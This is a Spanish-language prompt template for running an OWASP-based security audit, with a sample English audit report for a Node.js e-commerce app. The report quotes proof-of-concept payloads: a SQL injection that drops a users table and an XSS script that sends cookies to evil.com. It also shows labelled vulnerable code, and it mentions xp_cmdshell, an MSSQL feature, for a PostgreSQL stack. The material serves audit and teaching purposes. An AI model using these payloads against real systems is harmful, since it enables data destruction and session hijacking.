# Security Audit

**Categoría:** Security  
**Nivel:** Avanzado  
**Tecnologías:** OWASP, Security Testing

## Objetivo

Realizar una auditoría de seguridad completa de una aplicación, identificando vulnerabilidades y proporcionando recomendaciones de mitigación.

## Contexto

Este prompt guía una revisión exhaustiva de seguridad siguiendo OWASP Top 10 y mejores prácticas. Incluye revisión de código, configuración, y arquitectura.

## Prompt

```
Realiza una auditoría de seguridad completa para una aplicación {{app_type}} usando {{tech_stack}}.

Áreas a auditar:

1. OWASP Top 10:
   - A01: Broken Access Control
   - A02: Cryptographic Failures
   - A03: Injection
   - A04: Insecure Design
   - A05: Security Misconfiguration
   - A06: Vulnerable Components
   - A07: Authentication Failures
   - A08: Software and Data Integrity
   - A09: Security Logging/Monitoring
   - A10: Server-Side Request Forgery

2. Autenticación y Autorización:
   - Mecanismo de autenticación implementado
   - Fuerza de contraseñas requerida
   - Multi-factor authentication disponible
   - Session management seguro
   - Token security (JWT, OAuth)
   - Role-based access control
   - Privilege escalation posible

3. Validación de Entrada:
   - Validación client-side y server-side
   - Sanitización de inputs
   - SQL injection prevention
   - XSS prevention
   - Command injection prevention
   - Path traversal prevention
   - LDAP injection prevention

4. Manejo de Datos Sensibles:
   - Encriptación at rest
   - Encriptación in transit (HTTPS)
   - Secure password storage (bcrypt/argon2)
   - PII protection
   - Secret management
   - Data masking en logs
   - Secure data deletion

5. Configuración de Seguridad:
   - Security headers (CSP, HSTS, X-Frame-Options)
   - CORS configuration
   - Cookie security (httpOnly, secure, sameSite)
   - Error handling (no information leakage)
   - Default credentials changed
   - Unnecessary services disabled
   - Latest security patches applied

6. Dependencias:
   - Vulnerability scan de npm/pip packages
   - Outdated dependencies
   - Known CVEs
   - License compliance
   - Dependency pinning

7. API Security:
   - Rate limiting implementado
   - Input validation en todos endpoints
   - Proper HTTP methods
   - CORS configurado correctamente
   - API versioning
   - API key/token security
   - GraphQL query depth limiting

8. Logging y Monitoring:
   - Security events logged
   - Failed authentication attempts tracked
   - Anomaly detection
   - Log tampering prevention
   - Sensitive data no en logs
   - Centralized logging
   - Alerting configurado

9. Infrastructure:
   - Firewall configurado
   - Network segmentation
   - DDoS protection
   - Backup encryption
   - Disaster recovery plan
   - Penetration testing results

Para cada vulnerabilidad identificada, proporciona:
- Severidad (Critical, High, Medium, Low)
- Descripción del problema
- Impacto potencial
- Pasos para reproducir
- Recomendación de mitigación
- Código de ejemplo (si aplica)

Formato de reporte:
- Executive Summary
- Vulnerabilities por severidad
- Detalles técnicos
- Plan de remediación
- Timeline recomendado
```

## Ejemplo de Uso

### Variables:
- `{{app_type}}`: "Web Application"
- `{{tech_stack}}`: "Node.js, Express, React, PostgreSQL"

## Resultados Esperados

### Reporte de Auditoría

```markdown
# Security Audit Report

**Application:** E-Commerce Platform
**Date:** 2024-01-15
**Auditor:** Security Team
**Stack:** Node.js, Express, React, PostgreSQL

## Executive Summary

This security audit identified **15 vulnerabilities** across different severity levels:
- 2 Critical
- 4 High
- 6 Medium
- 3 Low

Immediate action is required for Critical and High severity issues.

## Critical Vulnerabilities

### 1. SQL Injection in Search Endpoint

**Severity:** Critical
**CVSS Score:** 9.8
**CWE:** CWE-89

**Description:**
The `/api/products/search` endpoint concatenates user input directly into SQL query without proper sanitization.

**Location:**
`src/controllers/productController.js:45`

**Vulnerable Code:**
```javascript
// VULNERABLE
const query = `SELECT * FROM products WHERE name LIKE '%${req.query.search}%'`;
const results = await db.query(query);
```

**Impact:**
- Unauthorized database access
- Data exfiltration
- Data modification/deletion
- Potential RCE via xp_cmdshell

**Proof of Concept:**
```bash
GET /api/products/search?search='; DROP TABLE users; --
```

**Remediation:**
Use parameterized queries:
```javascript
// SECURE
const query = 'SELECT * FROM products WHERE name ILIKE $1';
const results = await db.query(query, [`%${req.query.search}%`]);
```

**Priority:** Immediate
**Estimated Fix Time:** 2 hours

---

### 2. Broken Authentication - No Session Timeout

**Severity:** Critical
**CVSS Score:** 8.1
**CWE:** CWE-613

**Description:**
User sessions never expire, allowing indefinite access even after logout from other devices.

**Location:**
`src/middleware/auth.js`

**Impact:**
- Unauthorized access to user accounts
- Session hijacking risk
- Compliance violations (PCI-DSS, GDPR)

**Current Implementation:**
```javascript
// NO EXPIRATION
const token = jwt.sign({ userId: user.id }, SECRET);
```

**Remediation:**
```javascript
// WITH EXPIRATION
const token = jwt.sign(
  { userId: user.id },
  SECRET,
  { expiresIn: '15m' }
);

// Implement refresh token mechanism
const refreshToken = jwt.sign(
  { userId: user.id },
  REFRESH_SECRET,
  { expiresIn: '7d' }
);
```

**Priority:** Immediate
**Estimated Fix Time:** 4 hours

## High Severity Vulnerabilities

### 3. Cross-Site Scripting (XSS) in User Comments

**Severity:** High
**CVSS Score:** 7.3
**CWE:** CWE-79

**Description:**
User-generated content in product reviews is rendered without sanitization.

**Location:**
`src/components/ProductReview.jsx:25`

**Vulnerable Code:**
```jsx
// VULNERABLE
<div dangerouslySetInnerHTML={{ __html: review.comment }} />
```

**Impact:**
- Session hijacking
- Credential theft
- Malware distribution
- Defacement

**Proof of Concept:**
```javascript
POST /api/reviews
{
  "comment": "<script>document.location='http://evil.com?c='+document.cookie</script>"
}
```

**Remediation:**
```jsx
// SECURE - Option 1: Don't use dangerouslySetInnerHTML
<div>{review.comment}</div>

// SECURE - Option 2: Use DOMPurify
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(review.comment) 
}} />
```

**Priority:** High
**Estimated Fix Time:** 3 hours

---

### 4. Missing Security Headers

**Severity:** High
**CVSS Score:** 6.5
**CWE:** CWE-693

**Description:**
Critical security headers are not configured.

**Missing Headers:**
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security
- Referrer-Policy

**Impact:**
- Clickjacking attacks
- MIME type confusion
- Man-in-the-middle attacks
- Cross-site scripting

**Remediation:**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  frameguard: {
    action: 'deny'
  },
  noSniff: true,
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
  }
}));
```

**Priority:** High
**Estimated Fix Time:** 2 hours

## Medium Severity Vulnerabilities

### 5. Weak Password Requirements

**Severity:** Medium
**CVSS Score:** 5.3
**CWE:** CWE-521

**Description:**
Password requirements only enforce minimum length of 6 characters.

**Current Implementation:**
```javascript
if (password.length < 6) {
  return 'Password too short';
}
```

**Impact:**
- Brute force attacks
- Dictionary attacks
- Credential stuffing

**Remediation:**
```javascript
const passwordSchema = z.string()
  .min(12, 'Password must be at least 12 characters')
  .regex(/[a-z]/, 'Must contain lowercase letter')
  .regex(/[A-Z]/, 'Must contain uppercase letter')
  .regex(/[0-9]/, 'Must contain number')
  .regex(/[^a-zA-Z0-9]/, 'Must contain special character');

// Check against common passwords
const commonPasswords = require('common-passwords');
if (commonPasswords.includes(password)) {
  return 'Password is too common';
}
```

**Priority:** Medium
**Estimated Fix Time:** 3 hours

## Remediation Plan

### Phase 1: Immediate (0-7 days)
1. Fix SQL Injection vulnerability
2. Implement session expiration
3. Deploy security headers
4. Fix XSS in reviews

### Phase 2: Short-term (1-4 weeks)
5. Strengthen password requirements
6. Implement rate limiting
7. Update vulnerable dependencies
8. Add input validation middleware

### Phase 3: Medium-term (1-3 months)
9. Implement comprehensive logging
10. Set up security monitoring
11. Conduct penetration testing
12. Security training for developers

## Recommendations

1. **Implement DevSecOps:**
   - Integrate SAST tools (SonarQube, CodeQL)
   - Dependency scanning (Snyk, Dependabot)
   - Container scanning (Trivy)

2. **Regular Security Reviews:**
   - Quarterly security audits
   - Monthly dependency updates
   - Weekly vulnerability scanning

3. **Security Training:**
   - OWASP Top 10 training
   - Secure coding practices
   - Incident response procedures

4. **Compliance:**
   - GDPR compliance review
   - PCI-DSS if handling payments
   - SOC 2 certification path
```

## Tips Adicionales

### Automated scanning:
```
Integra herramientas:
- SAST: SonarQube, CodeQL, Semgrep
- DAST: OWASP ZAP, Burp Suite
- Dependency: Snyk, npm audit, Dependabot
```

### Penetration testing:
```
Realiza pruebas de penetración:
- Manual testing de lógica de negocio
- Automated scanning de infraestructura
- Social engineering assessment
```

---

_Security Audit - Identificando y mitigando vulnerabilidades_ 🔒
